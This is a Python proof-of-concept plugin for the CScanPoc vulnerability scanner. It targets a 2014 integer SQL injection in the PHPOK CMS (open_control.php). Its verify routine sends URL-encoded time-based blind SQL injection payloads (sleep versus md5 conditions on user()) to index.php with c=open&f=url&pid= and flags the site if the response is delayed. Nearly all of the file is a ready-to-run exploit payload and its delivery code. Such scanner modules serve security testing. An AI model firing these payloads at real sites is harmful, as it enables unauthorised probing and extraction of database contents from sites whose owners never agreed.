# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'PHPOK_0013'  # 平台漏洞编号，留空
    name = 'PHPOK SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-18'  # 漏洞公布时间
    desc = '''
        PHPOK是一套允许用户高度自由配置的企业站程序，基于LGPL协议开源授权。
        在framework/www/open_control.php中:
        发现$id 虽然做了全局的过滤，但是sql语句中并没有两侧加上引号，这样过滤就没啥意义了，直接可以sql整形注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2651/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPOK'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd4a8d8a8-caf1-4ca5-b1a2-97b23dbf7a96'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload_sleep = "/index.php?c=open&f=url&pid=0%20or%20if%28ord%28substr%28user%28%29%2C1%2C1%29%29%3D1%2Csleep%28%205%29%2C1%29%3D0"
            payload_normal = "/index.php?c=open&f=url&pid=0%20or%20if%28ord%28substr%28user%28%29%2C1%2C1%29%29%3D1%2Cmd5%28%20c%29%2C1%29%3D0"
            url_sleep = self.target + payload_sleep
            url_normal = self.target + payload_normal
            time_start = time.time()
            requests.get(url_normal)
            time_end_normal = time.time()
            requests.get(url_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal)-(time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
